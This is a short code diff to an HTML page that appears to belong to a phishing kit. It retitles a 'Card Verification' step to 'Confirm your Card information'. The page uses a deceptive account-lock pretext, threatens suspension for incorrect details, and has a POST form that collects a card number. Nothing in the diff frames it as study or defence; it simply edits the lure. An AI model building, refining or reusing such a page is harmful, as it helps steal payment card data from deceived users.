@@ -418,7 +418,7 @@
                 <span class="active">Card Verification</span>
                 <span>Success</span>
             </div>
-            <span class="title">Confirm your Account information</span>
+            <span class="title">Confirm your Card information</span>
             <span class="subtitle">Please verify your accurate information to automatically unlock your account. Incorrect information may lead to suspension of your account.</span>
              <form action="" method="POST">
                 <label for="card">Card Number</label>
